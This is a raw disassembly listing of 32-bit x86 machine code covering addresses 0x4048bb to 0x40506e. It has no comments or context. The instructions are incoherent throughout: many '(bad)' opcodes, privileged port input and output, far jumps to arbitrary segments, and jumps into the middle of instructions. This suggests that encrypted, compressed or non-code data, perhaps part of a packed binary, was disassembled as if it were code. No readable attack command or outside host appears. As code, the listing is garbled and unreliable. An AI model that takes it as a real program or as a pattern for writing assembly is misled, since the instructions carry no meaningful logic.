  4048bb:	sahf   
  4048bc:	add    edx,edx
  4048be:	jno    0x404917
  4048c0:	or     al,0xe5
  4048c2:	mov    edi,0xb2bdbf4a
  4048c7:	cmp    BYTE PTR [eax+0x2e8eb4d3],al
  4048cd:	xor    BYTE PTR [eax],cl
  4048cf:	cmp    eax,0xd8951847
  4048d4:	call   0xf7f:0x90d33f72
  4048db:	in     eax,0xb4
  4048dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048de:	dec    esi
  4048df:	ret    
  4048e0:	retf   0x6c1b
  4048e3:	or     al,0x4e
  4048e5:	out    0xe6,al
  4048e7:	sahf   
  4048e8:	jns    0x40489d
  4048ea:	or     bh,ah
  4048ec:	pusha  
  4048ed:	pop    ds
  4048ee:	ja     0x4048e0
  4048f0:	call   0x35566a6
  4048f5:	pop    ss
  4048f6:	or     DWORD PTR [ecx+0x57],ebp
  4048f9:	or     ah,BYTE PTR [ecx]
  4048fb:	dec    BYTE PTR [edx+0x2e]
  4048fe:	dec    ecx
  4048ff:	loop   0x4048eb
  404901:	pop    edx
  404902:	out    0x97,al
  404904:	pop    ebx
  404905:	mov    ebp,0x72addfee
  40490a:	jp     0x4048c1
  40490c:	or     DWORD PTR [ebp-0x419ac527],eax
  404912:	enter  0x1fc2,0xb4
  404916:	mov    bl,0xc0
  404918:	pop    eax
  404919:	(bad)  
  40491a:	push   edx
  40491b:	or     eax,0xbe2f6582
  404920:	sbb    bl,bh
  404922:	xor    eax,0x54e3490f
  404927:	push   0xa03f899d
  40492c:	imul   esi,esi,0xffffffca
  40492f:	adc    edi,DWORD PTR [ebp-0x5f]
  404932:	sub    al,BYTE PTR [ebp-0xa]
  404935:	(bad)  
  404936:	push   0x41
  404938:	push   esi
  404939:	fistp  DWORD PTR [esi-0xb6dea0f]
  40493f:	stc    
  404940:	sub    ebp,edx
  404942:	xor    edx,DWORD PTR [ebx+0x28a3ef32]
  404948:	sub    eax,0xa
  40494b:	mov    esi,0x3d2e5ef6
  404950:	mov    ebp,0x62bd19bc
  404955:	fisubr WORD PTR [ebp+0x22eb1b9]
  40495b:	nop
  40495c:	inc    ebp
  40495d:	mov    al,0x7d
  40495f:	inc    esp
  404960:	inc    esi
  404961:	add    al,0x21
  404963:	jmp    0x20e7:0x417b2b26
  40496a:	jge    0x4049ba
  40496c:	in     eax,dx
  40496d:	xchg   BYTE PTR [ebx+0x2c430866],bh
  404973:	push   ds
  404974:	add    edx,esp
  404976:	data16 icebp 
  404978:	pop    es
  404979:	push   esp
  40497a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40497b:	xor    eax,0x3da80e79
  404980:	sub    DWORD PTR [edx+0x52bcbde6],0x8648eef
  40498a:	loopne 0x404918
  40498c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40498d:	xchg   DWORD PTR [edx],eax
  40498f:	fdivr  st(5),st
  404991:	imul   esi,esp,0x51
  404994:	jo     0x4049f2
  404996:	popa   
  404997:	ja     0x404977
  404999:	(bad)  
  40499a:	adc    eax,DWORD PTR [edx+0x2a]
  40499d:	mov    esp,0x2eab1c89
  4049a2:	ror    DWORD PTR [ecx+0x61bbe8a],1
  4049a8:	out    0x2a,eax
  4049aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049ab:	cli    
  4049ac:	dec    edi
  4049ad:	mov    al,0x1d
  4049af:	push   ds
  4049b0:	xchg   edx,eax
  4049b1:	xor    eax,0xee9ee9a3
  4049b6:	cmp    ch,ah
  4049b8:	and    al,0x25
  4049ba:	or     BYTE PTR [edx+ecx*2+0xc],ch
  4049be:	mov    gs,WORD PTR [ecx+0x7f]
  4049c1:	mov    bl,0x58
  4049c3:	fdivr  QWORD PTR [ebp+0x45058d54]
  4049c9:	pop    ecx
  4049ca:	stos   DWORD PTR es:[edi],eax
  4049cb:	fisubr DWORD PTR [edi-0x15]
  4049ce:	inc    eax
  4049cf:	jmp    0xd4da638c
  4049d4:	adc    al,0x2c
  4049d6:	cli    
  4049d7:	(bad)  
  4049d8:	jmp    0x4049cd
  4049da:	int3   
  4049db:	lods   eax,DWORD PTR ds:[esi]
  4049dc:	cs call 0x2175badf
  4049e2:	ins    BYTE PTR es:[edi],dx
  4049e3:	fdiv   QWORD PTR [eax-0x18a9b552]
  4049e9:	push   es
  4049ea:	cmp    al,0xb6
  4049ec:	mov    ch,0x61
  4049ee:	add    DWORD PTR ds:[eax+ebp*2-0x70631d32],0xefa3215f
  4049fa:	and    al,BYTE PTR [ecx-0x1c30ba6e]
  404a00:	in     eax,dx
  404a01:	cwde   
  404a02:	ficomp WORD PTR gs:[ecx]
  404a05:	ror    BYTE PTR [ebx],cl
  404a07:	and    eax,0x5ce0ef8
  404a0c:	pop    es
  404a0d:	shl    ebx,1
  404a0f:	cwde   
  404a10:	dec    ebp
  404a11:	add    esi,ebp
  404a13:	in     eax,0x57
  404a15:	or     BYTE PTR [eax],bh
  404a17:	sub    al,0x3f
  404a19:	adc    dh,BYTE PTR [ebp-0x4a]
  404a1c:	or     esp,ecx
  404a1e:	daa    
  404a1f:	cmc    
  404a20:	jmp    0x86c4b33e
  404a25:	xchg   bh,bh
  404a27:	mov    DWORD PTR ds:0x3ba1cb30,ecx
  404a2d:	retf   
  404a2e:	jne    0x404a67
  404a30:	or     bl,BYTE PTR [edi]
  404a32:	jmp    0xc8ac:0xe88f644d
  404a39:	push   es
  404a3a:	frstor [ebx-0x7ef75492]
  404a40:	out    0x6,eax
  404a42:	inc    esi
  404a43:	ret    0xf516
  404a46:	lock add eax,0x2b852417
  404a4c:	push   0xbcaa4946
  404a51:	loopne 0x404aad
  404a53:	loopne 0x404a11
  404a55:	inc    edi
  404a56:	mov    cs,WORD PTR [edi]
  404a58:	ror    BYTE PTR [ebx],1
  404a5a:	push   edi
  404a5b:	(bad)  
  404a5d:	in     eax,0x60
  404a5f:	jmp    0x4049e8
  404a61:	inc    edx
  404a62:	(bad)
  404a66:	and    DWORD PTR [ecx-0x3f],edx
  404a69:	sbb    al,0xa1
  404a6b:	mov    ecx,0xec504e66
  404a70:	ins    BYTE PTR es:[edi],dx
  404a71:	push   edi
  404a72:	leave  
  404a73:	cwde   
  404a74:	or     BYTE PTR [ecx+eiz*8+0x250d63d6],al
  404a7b:	dec    esi
  404a7c:	shr    DWORD PTR ds:0x929e9af9,cl
  404a82:	je     0x404a5e
  404a84:	ret    0x7cc4
  404a87:	jmp    0x330d224
  404a8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a8d:	test   BYTE PTR [eax+0x5b],0xbe
  404a91:	mov    dl,0xcc
  404a93:	sbb    al,0x11
  404a95:	push   ds
  404a96:	cmc    
  404a97:	outs   dx,BYTE PTR ds:[esi]
  404a98:	inc    edi
  404a99:	xlat   BYTE PTR ds:[ebx]
  404a9a:	push   esp
  404a9b:	(bad)  
  404a9c:	push   esp
  404a9d:	pop    esp
  404a9e:	ret    0x695c
  404aa1:	outs   dx,BYTE PTR ds:[esi]
  404aa2:	in     al,0x97
  404aa4:	push   ebx
  404aa5:	lock jge 0x404b0c
  404aa8:	xor    DWORD PTR [eax-0x78],ebp
  404aab:	cld    
  404aac:	inc    ecx
  404aad:	inc    eax
  404aae:	mov    dl,0xbd
  404ab0:	mov    ds:0x27aa7c1f,eax
  404ab5:	mov    bh,0xa6
  404ab7:	(bad)  
  404ab8:	jp     0x404aa1
  404aba:	loope  0x404b38
  404abc:	lods   al,BYTE PTR ds:[esi]
  404abd:	es push ds
  404abf:	fldcw  WORD PTR [eax+0x722e1d63]
  404ac5:	int    0x28
  404ac7:	fisttp QWORD PTR [esi]
  404ac9:	fimul  DWORD PTR [di]
  404acc:	jbe    0x404b0f
  404ace:	imul   ebx,DWORD PTR [eax+edi*2],0x2b
  404ad2:	test   DWORD PTR [edi-0xaa00183],edi
  404ad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ad9:	loope  0x404adc
  404adb:	mov    fs,WORD PTR [ebx+0x59]
  404ade:	adc    DWORD PTR [ebp-0x59],0x2a40fb34
  404ae5:	scas   eax,DWORD PTR es:[edi]
  404ae6:	dec    eax
  404ae7:	imul   ebx,DWORD PTR [edi-0x6],0xffffffd3
  404aeb:	std    
  404aec:	into   
  404aed:	int    0x5e
  404aef:	ja     0x404ae9
  404af1:	sbb    BYTE PTR [edi],al
  404af3:	pusha  
  404af4:	xchg   esp,eax
  404af5:	rol    cl,cl
  404af7:	mov    bh,0x12
  404af9:	shl    DWORD PTR [ebx],cl
  404afb:	pop    ecx
  404afc:	pop    ds
  404afd:	add    bl,BYTE PTR [edi+edi*8+0x2f]
  404b01:	jge    0x404a8b
  404b03:	add    al,0x7d
  404b05:	cdq    
  404b06:	xchg   edx,eax
  404b07:	xchg   BYTE PTR [ebx-0x37],al
  404b0a:	cs int3 
  404b0c:	jp     0x404b29
  404b0e:	cld    
  404b0f:	fisub  DWORD PTR [ecx+0x6d]
  404b12:	pop    ebx
  404b13:	cwde   
  404b14:	jl     0x404ab5
  404b16:	push   es
  404b17:	jo     0x404b25
  404b19:	dec    ebx
  404b1a:	push   ss
  404b1b:	cmp    eax,0xaaaf4503
  404b20:	stos   BYTE PTR es:[edi],al
  404b21:	xchg   esp,eax
  404b22:	fst    QWORD PTR [eax]
  404b24:	(bad)  
  404b25:	jns    0x404ae5
  404b27:	add    bh,BYTE PTR [ecx-0x5b]
  404b2a:	out    dx,al
  404b2b:	push   ebx
  404b2c:	shr    BYTE PTR [esi+0x550940b],0x37
  404b33:	pop    esp
  404b34:	pop    ecx
  404b35:	mov    esi,0x5828749f
  404b3a:	or     al,BYTE PTR [esi-0x3fe1b329]
  404b40:	test   al,0xc2
  404b42:	loop   0x404b79
  404b44:	pushf  
  404b45:	ret    
  404b46:	call   0x3541:0x92bdec97
  404b4d:	test   DWORD PTR [ecx-0x71],esp
  404b50:	xor    BYTE PTR [esi],bl
  404b52:	or     edx,DWORD PTR [edi+0x4f]
  404b55:	das    
  404b56:	mov    edx,0x7affd515
  404b5b:	mov    dh,BYTE PTR gs:[ebx+0x56]
  404b5f:	mov    ch,0xa8
  404b61:	pushf  
  404b62:	sbb    cl,0x2
  404b65:	pop    ecx
  404b66:	icebp  
  404b67:	(bad)  
  404b68:	sbb    edi,0x76
  404b6b:	jmp    0x9b1a:0x31c5c78c
  404b72:	pop    edx
  404b73:	fcmovnu st,st(4)
  404b75:	inc    edi
  404b76:	cmp    al,0x79
  404b78:	ins    DWORD PTR es:[edi],dx
  404b79:	(bad)  
  404b7a:	mov    ds:0xbba8b8b2,al
  404b7f:	xchg   ecx,eax
  404b80:	jmp    0xa64c:0xd460672
  404b87:	jo     0x404b3b
  404b89:	add    BYTE PTR [ebx-0x6f],0xc9
  404b8d:	in     al,dx
  404b8e:	(bad)  
  404b8f:	pop    ss
  404b90:	add    edx,DWORD PTR [ecx+0x13]
  404b93:	and    esi,DWORD PTR [edx-0x107c9913]
  404b99:	inc    ecx
  404b9a:	outs   dx,DWORD PTR gs:[esi]
  404b9c:	lods   eax,DWORD PTR ds:[esi]
  404b9d:	test   BYTE PTR [edi+0x38],al
  404ba0:	cdq    
  404ba1:	maxps  xmm3,XMMWORD PTR [ebp-0x903a449]
  404ba8:	icebp  
  404ba9:	sbb    ecx,ebp
  404bab:	mov    cl,0x8b
  404bad:	push   ds
  404bae:	adc    al,0xa7
  404bb0:	jmp    0x9c090be3
  404bb5:	iret   
  404bb6:	mov    edi,0x6f5f52e6
  404bbb:	popa   
  404bbc:	pop    edi
  404bbd:	mov    al,ds:0xb6e074be
  404bc2:	in     al,dx
  404bc3:	call   0xd1f4ad60
  404bc8:	add    eax,0x8525c909
  404bcd:	cdq    
  404bce:	push   esp
  404bcf:	popf   
  404bd0:	push   ecx
  404bd1:	push   ds
  404bd2:	xchg   esi,eax
  404bd3:	icebp  
  404bd4:	and    DWORD PTR [ebp-0x5a159c51],esp
  404bda:	and    bl,BYTE PTR [ebp+0x1387b8cd]
  404be0:	data16 xlat BYTE PTR ds:[ebx]
  404be2:	in     al,dx
  404be3:	jae    0xbc0b8a04
  404be9:	xchg   edi,eax
  404bea:	stc    
  404beb:	xchg   esi,eax
  404bec:	xchg   ecx,eax
  404bed:	lds    eax,FWORD PTR [esi+0x54]
  404bf0:	xchg   esi,eax
  404bf1:	inc    esp
  404bf2:	xchg   DWORD PTR [eax+0x691aaaf2],ebp
  404bf8:	es enter 0xdef3,0x6
  404bfd:	rol    BYTE PTR [edx+0x56],cl
  404c00:	mov    dl,0x8b
  404c02:	add    dl,BYTE PTR [edx]
  404c04:	stos   BYTE PTR es:[edi],al
  404c05:	and    eax,edi
  404c07:	fst    st(6)
  404c09:	js     0x404bdc
  404c0b:	cmp    ecx,0x63
  404c0e:	cmp    esp,DWORD PTR [eax-0x13d13dd8]
  404c14:	out    0xd8,al
  404c16:	and    bh,BYTE PTR [ecx]
  404c18:	pop    ebx
  404c19:	or     edi,DWORD PTR [ecx]
  404c1b:	jp     0x404c67
  404c1d:	lahf   
  404c1e:	int3   
  404c1f:	sbb    DWORD PTR [ecx-0x28],ebp
  404c22:	inc    eax
  404c23:	lods   eax,DWORD PTR ds:[esi]
  404c24:	clc    
  404c25:	jle    0x404be0
  404c27:	imul   ebp,ebp,0xe7241e32
  404c2d:	sub    dh,BYTE PTR [ecx-0x25]
  404c30:	mov    al,BYTE PTR [esi+0x3d67e33]
  404c36:	ins    BYTE PTR es:[edi],dx
  404c37:	shl    dl,cl
  404c39:	mov    ds:0x31b322a6,al
  404c3e:	stos   BYTE PTR es:[edi],al
  404c3f:	lods   eax,DWORD PTR ds:[esi]
  404c40:	sub    ch,BYTE PTR [edi-0x2a]
  404c43:	aaa    
  404c44:	cld    
  404c45:	out    dx,eax
  404c46:	and    BYTE PTR [edi-0x39],bl
  404c49:	inc    ebp
  404c4a:	nop
  404c4b:	push   esp
  404c4c:	jge    0x404cae
  404c4e:	push   ebx
  404c4f:	xlat   BYTE PTR ds:[ebx]
  404c50:	cdq    
  404c51:	inc    esi
  404c52:	cmc    
  404c53:	or     eax,0x14e4eb53
  404c58:	mov    dl,0xfc
  404c5a:	jne    0x404bfb
  404c5c:	cmp    DWORD PTR ds:0x7a095f08,ebp
  404c62:	add    BYTE PTR [ebp+0x6beaf0b4],cl
  404c68:	cmp    esp,esp
  404c6a:	xor    al,ch
  404c6c:	rcr    BYTE PTR [edi],0xdd
  404c6f:	rcl    DWORD PTR [ecx+0x33bc67ba],cl
  404c75:	xchg   ebx,eax
  404c76:	sbb    edi,DWORD PTR [edx]
  404c78:	ror    BYTE PTR [ebx],0xf7
  404c7b:	icebp  
  404c7c:	lods   eax,DWORD PTR ds:[esi]
  404c7d:	sahf   
  404c7e:	out    0xc8,al
  404c80:	cwde   
  404c81:	inc    di
  404c83:	dec    eax
  404c84:	(bad)  [ebp-0x118ec3e]
  404c8a:	shl    DWORD PTR [ebp+0x199b87e3],0x94
  404c91:	out    dx,al
  404c92:	(bad)  
  404c93:	and    edi,DWORD PTR [ecx]
  404c95:	sub    cl,BYTE PTR [edi-0x28ccfbff]
  404c9b:	ret    
  404c9c:	adc    dh,0x11
  404c9f:	xor    bl,bh
  404ca1:	enter  0x74fa,0x1d
  404ca5:	popa   
  404ca6:	scas   al,BYTE PTR es:[edi]
  404ca7:	mov    ch,0x82
  404ca9:	pop    esi
  404caa:	call   0xdb022181
  404caf:	cmp    DWORD PTR [esi+0x3e],ecx
  404cb2:	cmp    BYTE PTR gs:[ebx],0x9b
  404cb6:	(bad)  
  404cb7:	in     eax,0x30
  404cb9:	adc    BYTE PTR [esp+esi*8],ch
  404cbc:	loopne 0x404c81
  404cbe:	(bad)  
  404cbf:	sbb    eax,0xb836c677
  404cc4:	popf   
  404cc5:	lock mov eax,ds:0xaaf27061
  404ccb:	xor    al,0x8c
  404ccd:	and    DWORD PTR [eax+0x51],0xffffffa6
  404cd1:	arpl   bp,si
  404cd3:	inc    ecx
  404cd4:	pusha  
  404cd5:	clc    
  404cd6:	inc    eax
  404cd7:	iret   
  404cd8:	xor    al,0xbf
  404cda:	cli    
  404cdb:	into   
  404cdc:	sub    BYTE PTR [esi+edx*4],dh
  404cdf:	lahf   
  404ce0:	test   DWORD PTR [eax+0x3f],esp
  404ce3:	sbb    eax,0x268c4b74
  404ce8:	cmp    ecx,edi
  404cea:	sub    bh,BYTE PTR [esi+eiz*1-0x3b4da7be]
  404cf1:	adc    BYTE PTR [ebp-0x37b01668],ch
  404cf7:	lock out 0xf8,eax
  404cfa:	mov    esi,0x6cab3027
  404cff:	mov    edi,0xc3c652e0
  404d04:	arpl   WORD PTR [esp+eax*8],si
  404d07:	aaa    
  404d08:	mov    eax,ds:0x953acc32
  404d0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d0f:	test   eax,edx
  404d11:	adc    BYTE PTR ds:0xa85b6094,dl
  404d17:	repnz lods al,BYTE PTR ds:[esi]
  404d19:	and    ah,BYTE PTR [eax]
  404d1b:	xor    BYTE PTR [ebx-0x6b1ff60c],ah
  404d21:	mov    esi,0x3edc4550
  404d26:	mov    bl,0xe4
  404d28:	repnz cmp eax,DWORD PTR ss:[ebx-0x40]
  404d2d:	stc    
  404d2e:	jecxz  0x404d48
  404d30:	push   edx
  404d31:	in     eax,dx
  404d32:	add    esi,DWORD PTR ss:[esi+0x4d]
  404d36:	hlt    
  404d37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d38:	test   al,0xab
  404d3a:	and    BYTE PTR [ecx],dh
  404d3c:	out    0x2c,al
  404d3e:	stc    
  404d3f:	enter  0xc0d0,0xa8
  404d43:	loope  0x404da2
  404d45:	(bad)  
  404d46:	push   ebp
  404d47:	jnp    0x404d3b
  404d49:	fcom   st(0)
  404d4b:	das    
  404d4c:	pop    ecx
  404d4d:	ss or  eax,0x21ce287a
  404d53:	sbb    ebx,0x2a
  404d56:	sbb    eax,0xc9d4e7ea
  404d5b:	pop    esp
  404d5c:	jb     0x404d08
  404d5e:	xlat   BYTE PTR ds:[ebx]
  404d5f:	sub    eax,0x2cebead9
  404d64:	xchg   esp,eax
  404d65:	jb     0x404d3a
  404d67:	cmp    ch,cl
  404d69:	inc    ebx
  404d6a:	jle    0x404d76
  404d6c:	fdivr  st(1),st
  404d6e:	sar    ah,cl
  404d70:	jo     0x404d3f
  404d72:	mov    ebx,0x479dbbe5
  404d77:	dec    ebp
  404d78:	pop    ebx
  404d79:	daa    
  404d7a:	add    eax,0x925a52ae
  404d7f:	leave  
  404d80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d81:	test   al,0xac
  404d83:	out    dx,eax
  404d84:	stc    
  404d85:	push   ds
  404d86:	int    0x1
  404d88:	mov    ebp,0x69a07001
  404d8d:	push   ds
  404d8e:	daa    
  404d8f:	addr16 cmp al,0x72
  404d92:	ficom  WORD PTR [ebp-0x5d9ce2cb]
  404d98:	(bad)  
  404d99:	ins    DWORD PTR es:[edi],dx
  404d9a:	fnsave [esi]
  404d9c:	pop    ecx
  404d9d:	lods   al,BYTE PTR ds:[esi]
  404d9e:	shl    edi,cl
  404da0:	dec    esi
  404da1:	jo     0x404d61
  404da3:	mov    esi,0xe906492c
  404da8:	mov    eax,0x860e27fc
  404dad:	mov    ah,0xc8
  404daf:	popf   
  404db0:	inc    esp
  404db1:	pop    ebp
  404db2:	clc    
  404db3:	mov    ds:0x76c1d04,al
  404db8:	enter  0x91a0,0x2a
  404dbc:	push   edx
  404dbd:	pop    esp
  404dbe:	aas    
  404dbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404dc0:	test   BYTE PTR [ebp+0xc7ac564],bh
  404dc6:	not    ecx
  404dc8:	mov    DWORD PTR [ebx+0x66],ebx
  404dcb:	daa    
  404dcc:	or     al,0x74
  404dce:	pop    esp
  404dcf:	fiadd  DWORD PTR [edi]
  404dd2:	ins    BYTE PTR es:[edi],dx
  404dd3:	repz (bad) 
  404dd5:	jmp    0x404e56
  404dd7:	shl    DWORD PTR [edi-0x5c8baf72],cl
  404ddd:	in     eax,dx
  404dde:	cmp    al,0x6e
  404de0:	stc    
  404de1:	fprem1 
  404de3:	mov    al,0x25
  404de5:	popa   
  404de6:	test   eax,0xf9d2049
  404deb:	shr    esi,1
  404ded:	mov    edi,0x319628ba
  404df2:	jl     0x404ddb
  404df4:	rcl    DWORD PTR [eax],0xfd
  404df7:	mov    edi,DWORD PTR [ecx]
  404df9:	out    dx,al
  404dfa:	mov    DWORD PTR [esi-0x22],ebp
  404dfd:	pushw  ss
  404dff:	ror    dh,0xc0
  404e02:	ds push ebp
  404e04:	mov    fs,WORD PTR [edi]
  404e06:	(bad)  
  404e08:	and    al,0xf3
  404e0a:	or     BYTE PTR [ebx-0x39],0x4e
  404e0e:	xlat   BYTE PTR ds:[ebx]
  404e0f:	sbb    al,0x33
  404e11:	adc    eax,DWORD PTR [eax-0x25]
  404e14:	mov    eax,0x7894180d
  404e19:	stos   BYTE PTR es:[edi],al
  404e1a:	std    
  404e1b:	ins    BYTE PTR es:[edi],dx
  404e1c:	push   esp
  404e1d:	mov    ah,0x17
  404e1f:	enter  0xc2cf,0xba
  404e23:	dec    ebx
  404e24:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  404e26:	xchg   DWORD PTR [ecx],esp
  404e28:	lahf   
  404e29:	shl    DWORD PTR [edi-0x32670a2d],0x34
  404e30:	xchg   ebp,eax
  404e31:	or     DWORD PTR [edx-0x16378ec6],edx
  404e37:	cwde   
  404e38:	dec    ebp
  404e39:	cs mov bl,0x11
  404e3c:	aaa    
  404e3d:	lds    eax,FWORD PTR [ebx]
  404e3f:	mov    ebx,0xf04c029f
  404e44:	mov    dh,0xfc
  404e46:	xchg   ecx,edx
  404e48:	push   cs
  404e49:	cmp    eax,0x44cf922c
  404e4e:	xchg   BYTE PTR ds:0x810e2c24,dl
  404e54:	in     al,0x54
  404e56:	mov    esp,0xec4527a7
  404e5b:	or     edi,DWORD PTR ds:0x63edfc6d
  404e61:	rcl    BYTE PTR [ebp+0x55d06004],0x7d
  404e68:	inc    ebx
  404e69:	jae    0x404e39
  404e6b:	push   0x11c3ab8e
  404e70:	ffree  st(1)
  404e72:	aas    
  404e73:	ds je  0x404df8
  404e76:	sub    ebp,esi
  404e78:	loope  0x404dfd
  404e7a:	xor    DWORD PTR [ebx+0x16],edx
  404e7d:	xchg   edx,eax
  404e7e:	int    0x17
  404e80:	fdivp  st(0),st
  404e82:	das    
  404e83:	mov    ds:0x77186406,eax
  404e88:	xlat   BYTE PTR ds:[ebx]
  404e89:	adc    DWORD PTR [ecx+0x6c],edi
  404e8c:	sahf   
  404e8d:	inc    esp
  404e8e:	push   esi
  404e8f:	cmc    
  404e90:	push   ss
  404e91:	imul   esi,DWORD PTR [esi-0x79],0xffffffff
  404e95:	bound  ecx,QWORD PTR ds:0xeb623c46
  404e9b:	(bad)  
  404e9c:	(bad)  
  404e9d:	push   DWORD PTR ds:0x36975456
  404ea3:	jne    0x404e34
  404ea5:	push   es
  404ea6:	or     ecx,ecx
  404ea8:	pop    esp
  404ea9:	pop    es
  404eaa:	pop    esp
  404eab:	loopne 0x404edc
  404ead:	repz dec eax
  404eaf:	inc    esi
  404eb0:	mov    ebp,0xbacfe597
  404eb5:	fimul  WORD PTR [ebx]
  404eb7:	stc    
  404eb8:	lock dec esi
  404eba:	retf   
  404ebb:	test   esp,esp
  404ebd:	fdiv   QWORD PTR [eax]
  404ebf:	dec    BYTE PTR [ebx]
  404ec1:	call   0xeec19508
  404ec6:	test   DWORD PTR [ebp+ecx*2+0x35],esp
  404eca:	and    eax,0xd5809590
  404ecf:	mov    ds:0xd90ab376,al
  404ed4:	pop    esi
  404ed5:	aas    
  404ed6:	adc    ah,bh
  404ed8:	(bad)  
  404ed9:	lock popf 
  404edb:	iret   
  404edc:	aad    0x8e
  404ede:	(bad)  
  404edf:	sbb    ebp,edx
  404ee1:	and    eax,0xa648e6a2
  404ee6:	pop    ebx
  404ee7:	push   esp
  404ee8:	es jae 0x404eb1
  404eeb:	fs jp  0x404f47
  404eee:	dec    ecx
  404eef:	xor    dl,dl
  404ef1:	int3   
  404ef2:	mov    ds:0x9e8d71c5,al
  404ef7:	xchg   edx,ebx
  404ef9:	add    BYTE PTR [edi+0x57eab5de],cl
  404eff:	xchg   BYTE PTR [ebx-0x59],bl
  404f02:	inc    ebp
  404f03:	or     BYTE PTR ds:[ebx-0x2314e35f],al
  404f0a:	dec    eax
  404f0b:	pop    ds
  404f0c:	or     al,0x9
  404f0e:	scas   al,BYTE PTR es:[edi]
  404f0f:	dec    ecx
  404f10:	je     0x404f67
  404f12:	pop    esp
  404f13:	hlt    
  404f14:	or     ecx,DWORD PTR [eax]
  404f16:	xchg   esi,eax
  404f17:	das    
  404f18:	push   esi
  404f19:	hlt    
  404f1a:	fild   WORD PTR ds:0xb10f672a
  404f20:	fs mov edx,0x9e999d98
  404f26:	shr    esp,1
  404f28:	aad    0x2
  404f2a:	cmp    al,0x2a
  404f2c:	and    DWORD PTR [ecx-0x2a],0x6b12061b
  404f33:	inc    eax
  404f34:	out    0x7a,eax
  404f36:	jbe    0x404f33
  404f38:	adc    al,0x4b
  404f3a:	out    0x5d,al
  404f3c:	mov    DWORD PTR [edx-0x74260a6d],0xf6e347b2
  404f46:	int3   
  404f47:	adc    DWORD PTR [ebx],edx
  404f49:	call   0x32192bc9
  404f4e:	in     al,dx
  404f4f:	inc    ebx
  404f50:	pushf  
  404f51:	retf   0x79c5
  404f54:	inc    eax
  404f55:	(bad)  
  404f56:	xor    BYTE PTR [ebx-0x7],bl
  404f59:	loop   0x404f57
  404f5b:	mov    ah,0xc9
  404f5d:	rcl    DWORD PTR [ecx+0x7a26dffe],0x49
  404f64:	cmp    BYTE PTR [edx-0xf1a2070],0x48
  404f6b:	shl    DWORD PTR [ebp+0x30],1
  404f6e:	aaa    
  404f6f:	dec    esp
  404f70:	push   es
  404f71:	mov    bl,0xcd
  404f73:	fdivr  QWORD PTR [esi]
  404f75:	pop    esi
  404f76:	add    DWORD PTR [edi+eiz*4+0x2a861c38],0x48
  404f7e:	enter  0xb994,0x76
  404f82:	and    eax,0xdd8b086b
  404f87:	pop    es
  404f88:	fist   WORD PTR [ebx]
  404f8a:	sub    al,0x70
  404f8c:	or     eax,0x67cdc201
  404f91:	(bad)  
  404f92:	std    
  404f93:	jge    0x405002
  404f95:	adc    BYTE PTR [edi],cl
  404f97:	rcr    DWORD PTR [ecx-0x59],1
  404f9a:	xlat   BYTE PTR ds:[ebx]
  404f9b:	add    eax,0x7c61a708
  404fa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fa1:	cmp    edx,edx
  404fa3:	loope  0x404f4a
  404fa5:	cld    
  404fa6:	js     0x404fb6
  404fa8:	jb     0x404f3a
  404faa:	repz es inc eax
  404fad:	mov    WORD PTR [esi+ebx*1+0x7a],ss
  404fb1:	cmc    
  404fb2:	jbe    0x405007
  404fb4:	pop    eax
  404fb5:	dec    eax
  404fb6:	xlat   BYTE PTR ds:[ebx]
  404fb7:	xor    BYTE PTR [ebp+0x65],0xbc
  404fbb:	psubd  mm5,QWORD PTR [ecx-0x43]
  404fbf:	sbb    DWORD PTR [ebx+0x42],ebx
  404fc2:	and    DWORD PTR [ecx+0x198bae26],edx
  404fc8:	add    ch,dl
  404fca:	dec    edi
  404fcb:	cmc    
  404fcc:	imul   ebp,DWORD PTR [edi],0xffffffd7
  404fcf:	lods   eax,DWORD PTR ds:[esi]
  404fd0:	jp     0x404fbf
  404fd2:	test   eax,0xa68bfe69
  404fd7:	or     BYTE PTR [ecx-0x1d768a84],cl
  404fdd:	or     dl,BYTE PTR [edx+0x1232fcc4]
  404fe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404fe4:	sub    ebp,DWORD PTR [esi+0x3b677111]
  404fea:	nop
  404feb:	clc    
  404fec:	rcr    DWORD PTR [esi-0x4694830],cl
  404ff2:	loop   0x404f8f
  404ff4:	adc    DWORD PTR [edi],eax
  404ff6:	jns    0x405017
  404ff8:	stos   BYTE PTR es:[edi],al
  404ff9:	std    
  404ffa:	imul   ebx,eax,0x8ec648f2
  405000:	inc    edx
  405001:	cli    
  405002:	mov    ds:0xf2fc1a67,al
  405007:	retf   
  405008:	cmc    
  405009:	pop    eax
  40500a:	mov    esi,ds
  40500c:	(bad)  
  40500d:	mov    al,ds:0x57376867
  405012:	inc    edi
  405013:	in     eax,0x54
  405015:	push   ecx
  405016:	jmp    0x405023
  405018:	mov    dl,0xd4
  40501a:	sbb    BYTE PTR [edx+0x264e3799],dl
  405020:	sub    edx,DWORD PTR [edx+0x2dccba53]
  405026:	sbb    al,0x5b
  405028:	mov    dh,0xa2
  40502a:	fwait
  40502b:	into   
  40502c:	es mov dh,0xc0
  40502f:	rcl    BYTE PTR [eax-0x3f408321],0x25
  405036:	jmp    0x54e9af54
  40503b:	push   esi
  40503c:	retf   
  40503d:	push   esi
  40503e:	aad    0xb
  405040:	push   ebp
  405041:	jne    0x405042
  405043:	mov    dl,ah
  405045:	sub    edi,DWORD PTR [ecx+0x6f540e63]
  40504b:	in     al,dx
  40504c:	icebp  
  40504d:	loope  0x4050a1
  40504f:	or     BYTE PTR ds:0x24b66c20,0x42
  405056:	mov    eax,0xad32653d
  40505b:	xor    dl,bh
  40505d:	and    eax,0x8a730706
  405062:	loop   0x405009
  405064:	cmc    
  405065:	aad    0xb
  405067:	push   ds
  405068:	add    ah,ch
  40506a:	and    ebx,DWORD PTR [eax]
  40506c:	dec    BYTE PTR [edi]
  40506e:	sbb    al,BYTE PTR [ecx-0x1f40cfad]
